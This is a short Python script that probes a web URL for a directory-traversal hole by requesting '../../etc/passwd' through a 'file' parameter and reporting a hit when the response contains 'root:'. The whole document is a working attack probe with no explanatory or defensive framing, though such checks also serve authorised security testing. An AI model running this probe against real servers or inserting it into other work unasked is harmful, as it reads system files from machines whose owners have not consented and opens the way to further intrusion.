import requests

def test_directory_traversal(url):

    payload = "../../etc/passwd"
    target = f"{url}?file={payload}"
    response = requests.get(target)
    if "root:" in response.text:
        print(f"[+] founded: {target}")
    else:
        print("[-] safe.")
